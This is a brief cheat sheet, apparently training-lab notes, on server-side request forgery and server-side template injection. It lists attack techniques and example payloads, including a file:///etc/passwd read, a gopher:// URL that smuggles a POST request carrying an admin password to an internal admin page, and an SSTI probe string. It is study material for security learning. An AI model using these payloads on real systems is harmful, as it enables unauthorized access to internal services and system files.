### **SSRF (Server-Side Request Forgery)**

#### Exploitation

|Technique|Description|
|---|---|
|Internal Portscan|Accessing ports on localhost|
|Accessing Restricted Endpoints|Interacting with internal services|

#### Protocols

| Protocol | Example |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `http://` | `http://127.0.0.1/` |
| `file://` | `file:///etc/passwd` |
| `gopher://` | `gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin` |


### **SSTI (Server-Side Template Injection)**

| Category | Example |
| ------------ | ----------------------------------------------- |
| Exploitation | Templating Engines dynamically generate content |
| Test String | `${{<%[%'"}}%\.` |
